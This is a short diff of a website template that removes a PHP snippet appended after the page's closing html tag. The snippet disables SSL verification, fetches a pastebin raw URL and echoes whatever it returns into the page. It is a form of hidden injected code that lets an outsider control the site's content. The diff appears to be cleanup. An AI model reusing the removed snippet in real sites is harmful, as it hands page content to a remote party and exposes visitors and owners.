@@ -34,19 +34,3 @@
 <p>Powered by || <a href="https://skmaga.site" target="_blank">SkMaga.Site</a> || <a href="./sitemap.xml">SiteMap</a> || 
 (3) online </p>
  </div></footer></body></html>
-
-     <?php
-$arrContextOptions=array(
-"ssl"=>array(
-"verify_peer"=>false,
-"verify_peer_name"=>false,    ), );  
-$response = file_get_contents("https://pastebin.com/raw/1uEANTD6", 
-false, stream_context_create($arrContextOptions));
-echo $response; ?>
-
-
-
-    <!-- Analytics -->
-
-	</body>
-</html>
